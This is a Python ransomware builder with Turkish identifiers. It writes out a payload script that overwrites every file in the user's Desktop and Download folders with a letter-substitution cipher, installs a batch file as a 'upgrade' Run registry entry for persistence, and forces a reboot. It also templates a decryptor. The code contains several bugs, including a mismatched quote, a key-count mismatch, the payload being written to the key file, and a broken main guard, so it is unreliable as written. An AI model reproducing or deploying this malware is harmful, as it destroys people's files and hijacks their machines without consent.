from os import *
from sys import *
import random


def calc(x, y, index):
    for xx in range(0, len(y)):
        if xx == index:
            pass
        else:
            if x == y[xx]:
                x = str(random.randint(0, 1000))


a = str(random.randint(0, 1000))
b = str(random.randint(0, 1000))
c = str(random.randint(0, 1000))
d = str(random.randint(0, 1000))
e = str(random.randint(0, 1000))
f = str(random.randint(0, 1000))
g = str(random.randint(0, 1000))
h = str(random.randint(0, 1000))
i = str(random.randint(0, 1000))
j = str(random.randint(0, 1000))
k = str(random.randint(0, 1000))
l = str(random.randint(0, 1000))
m = str(random.randint(0, 1000))
n = str(random.randint(0, 1000))
o = str(random.randint(0, 1000))
p = str(random.randint(0, 1000))
r = str(random.randint(0, 1000))
s = str(random.randint(0, 1000))
t = str(random.randint(0, 1000))
u = str(random.randint(0, 1000))
v = str(random.randint(0, 1000))
y = str(random.randint(0, 1000))
w = str(random.randint(0, 1000))
q = str(random.randint(0, 1000))
z = str(random.randint(0, 1000))

r16 = [
    a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, r, s, t, u, v, y, w, q, z
]
for ii in range(0, len(r16)):
    calc(r16[ii], r16, ii)
# {},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}
ransom = """
from sys import *
import os


def c(v,f):
 keys = [
  {},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}
 ]
 keys_a = [
  "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","w","q","z"
 ]
 for i in range(0,len(keys)):
  v = v.replace(keys_a[i], " r"+keys[i]+" ")
  print(v)
 print(v)
 f.write(v)

def e(veri):
 with open(veri,"r") as x:
  x = x.read()
 with open(veri, "w") as y:
  c(x,y)
  
def rans(k):
 for konum, gereksiz, liste in os.walk(k):
  if liste:
   for dosya in liste:
    veri = konum+"/"+dosya
    e(veri)
    
    

rans(os.path.join(os.environ["HOMEPATH"], "Desktop"))
rans(os.path.join(os.environ["HOMEPATH"], "Download"))

os.system("copy cw.bat C:\\Users")
os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "C:\\Users\\cw.bat"')

os.system("shutdown -r")
""".format(
    '"' + a + '"',
    '"' + b + '"',
    '"' + c + '"',
    '"' + d + '"',
    '"' + e + '"',
    '"' + f + '"',
    '"' + g + '"',
    '"' + h + '"',
    '"' + i + '"',
    "'" + j + '"',
    '"' + k + '"',
    '"' + l + '"',
    '"' + m + '"',
    '"' + n + '"',
    '"' + o + '"',
    '"' + p + '"',
    '"' + r + '"',
    '"' + s + '"',
    '"' + t + '"',
    '"' + u + '"',
    '"' + v + '"',
    '"' + y + '"',
    '"' + w + '"',
    '"' + q + '"',
    '"' + z + '"'
)
key = """
import os
#import requests


def c(v,f):
 keys = [
  {},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}
 ]
 keys_a = [
  "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","w","q","z"
 ]
 for i in range(0,len(keys)):
  #v = v.replace(keys_a[i], " r"+keys[i]+" ")

  v = v.replace(" r"+keys[i]+" ", keys_a[i])
  
        #print(v)
 print(v)
 f.write(v)

def e(veri):
 with open(veri,"r") as x:
  x = x.read()
 with open(veri, "w") as y:
  c(x,y)
  
def rans(k):
 for konum, gereksiz, liste in os.walk(k):
  if liste:
   for dosya in liste:
    veri = konum+"/"+dosya
    e(veri)
rans(os.path.join(os.environ["HOMEPATH"], "Desktop"))
rans(os.path.join(os.environ["HOMEPATH"], "Download"))
""".format(
    '"' + a + '"',
    '"' + b + '"',
    '"' + c + '"',
    '"' + d + '"',
    '"' + e + '"',
    '"' + f + '"',
    '"' + g + '"',
    '"' + h + '"',
    '"' + i + '"',
    "'" + j + '"',
    '"' + k + '"',
    '"' + l + '"',
    '"' + m + '"',
    '"' + n + '"',
    '"' + o + '"',
    '"' + p + '"',
    '"' + r + '"',
    '"' + s + '"',
    '"' + t + '"',
    '"' + u + '"',
    '"' + v + '"',
    '"' + y + '"',
    '"' + w + '"',
    '"' + q + '"',
    '"' + z + '"'
)


def opt(name):
    print(ransom)
    print(key)
    namer = name + "Ransom.py"
    namek = name + "Key"
    rns = open(namer, "w")
    rns.write(ransom)
    rns.close()
    rnk = open(namek, "w")
    rnk.write(ransom)
    rnk.close()


if name == 'main':
    try:
        name = argv[1]
    except:
        name = ""
    opt(name)
